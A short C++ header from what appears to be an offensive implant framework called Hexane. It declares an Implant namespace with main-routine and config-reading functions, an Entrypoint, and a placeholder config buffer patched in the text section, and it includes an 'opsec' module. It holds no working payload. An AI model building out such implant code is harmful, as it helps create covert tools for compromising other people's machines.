#ifndef HEXANE_CORELIB_BASE_HPP
#define HEXANE_CORELIB_BASE_HPP

#include <core/monolith.hpp>
#include <core/include/opsec.hpp>
#include <core/include/memory.hpp>
#include <core/include/parser.hpp>
#include <core/include/dispatch.hpp>

_text(F) BYTE __config[sizeof(_hexane)] = {
    0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
};

EXTERN_C FUNCTION VOID Entrypoint(HMODULE Base);
namespace Implant {
    FUNCTION VOID MainRoutine();
    FUNCTION VOID ReadConfig();
}
#endif //HEXANE_CORELIB_BASE_HPP